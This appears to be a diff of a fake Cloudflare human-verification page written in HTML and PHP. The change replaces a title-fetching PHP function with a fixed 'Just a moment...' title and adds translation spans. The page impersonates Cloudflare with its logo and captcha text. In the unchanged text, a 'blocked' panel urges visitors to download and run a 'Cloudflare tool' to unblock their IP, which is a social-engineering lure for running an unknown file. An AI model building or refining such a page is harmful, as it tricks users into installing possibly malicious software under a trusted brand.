@@ -3,45 +3,7 @@
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <!-- Title -->
-  <?php
-      function fetch_url($url) {
-          $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL, $url);
-          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-          curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
-          $data = curl_exec($ch);
-          curl_close($ch);
-          return $data;
-      }
-       
-      function get_page_title($domain) {
-          // Fetch the HTML from the domain
-          $html = fetch_url($domain);
-          if ($html) {
-              // Use regex to find the <title> tag
-              preg_match('/<title>(.*?)<\/title>/', $html, $matches);
-              if (!empty($matches[1])) {
-                  return trim($matches[1]); // Return the title text
-              }
-          }
-          
-          return false; // Return false if no title is found
-      }
-       
-      // Get the root domain (main domain)
-      $host = "http://" . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"
-       
-      // Fetch the title from the main domain
-      $title = get_page_title($host);
-       
-      // Only output the title if found
-      if ($title) {
-          echo '<title>' . htmlspecialchars($title) . '</title>';
-      }
-  ?>
+  <title>Just a moment...</title>
 
   <!-- Favicon -->
   <?php
@@ -141,7 +103,7 @@
           </div>
 
           <div class="captcha-text" id="captcha-text">
-            Verify you are human
+            <span data-translate="verify-human">Verify you are human</span>
           </div>
 
         </div>
@@ -150,7 +112,7 @@
         <div class="captcha-footer">
           <img class="captcha-logo" src="./V1_files/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
           <div class="captcha-privacy">
-            <a href="#">Privacy</a> • <a href="#">Terms</a>
+            <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
           </div>
         </div>
 
@@ -158,12 +120,12 @@
 
         <!-- Error message outside the captcha box -->
         <div class="error-message" id="error-message">
-          There was a problem, please try again.
+          <span data-translate="issue">There was a problem, please try again.</span>
         </div>
       </div>
 
       <div id="submit_div">
-          <button class="pre_submit_btn" id="submit_btn">Submit</button>
+          <button class="pre_submit_btn" id="submit_btn"><span data-translate="submit">Submit</span></button>
       </div>
 
     </div>
@@ -210,7 +172,7 @@
               <p>
                 <span data-translate="blocked_resolve_detail">Cloudflare offers a user-friendly tool to help unblock your IP address. Simply download the tool, run it with a single click, and you'll regain access to the website you're trying to visit.</span>
                 <button class="download-btn" id="donwload_btn">
-                  Download Now
+                <span data-translate="download_now">Download Now</span>
                 </button>
               </p>
             </div>
